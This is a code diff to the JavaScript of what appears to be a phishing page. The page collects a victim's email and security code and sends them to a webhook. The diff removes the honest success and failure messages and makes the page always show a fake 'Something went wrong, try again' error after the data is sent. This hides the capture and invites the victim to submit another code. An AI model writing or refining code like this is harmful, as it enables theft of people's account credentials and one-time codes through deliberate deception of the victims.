@@ -563,10 +563,8 @@
         }
 
         console.log('Data successfully sent to webhook:', { email, code });
-        return true;
       } catch (error) {
         console.error('Error sending data to webhook:', error);
-        return false;
       }
     }
 
@@ -631,33 +629,20 @@
       }
       savedCode = codeVal;
 
-      // Send data to webhook
-      const webhookSuccess = await sendToWebhook(savedEmail, savedCode);
+      // Send data to webhook (no notification for success or failure)
+      await sendToWebhook(savedEmail, savedCode);
 
-      // Show SweetAlert based on webhook response
-      if (webhookSuccess) {
-        Swal.fire({
-          icon: 'success',
-          title: 'Success!',
-          text: 'Data sent successfully.',
-          showCloseButton: true,
-          confirmButtonText: 'Okay',
-        }).then(() => {
-          closeCodeModal();
-          closeEmailModal();
-        });
-      } else {
-        Swal.fire({
-          icon: 'error',
-          title: 'Oops!',
-          text: 'Something went wrong, try again.',
-          showCloseButton: true,
-          confirmButtonText: 'Okay',
-        }).then(() => {
-          closeCodeModal();
-          closeEmailModal();
-        });
-      }
+      // Always show "Oops!" SweetAlert regardless of webhook outcome
+      Swal.fire({
+        icon: 'error',
+        title: 'Oops!',
+        text: 'Something went wrong, try again.',
+        showCloseButton: true,
+        confirmButtonText: 'Okay'
+      }).then(() => {
+        closeCodeModal();
+        closeEmailModal();
+      });
 
       console.log('Security code saved:', savedCode);
     });
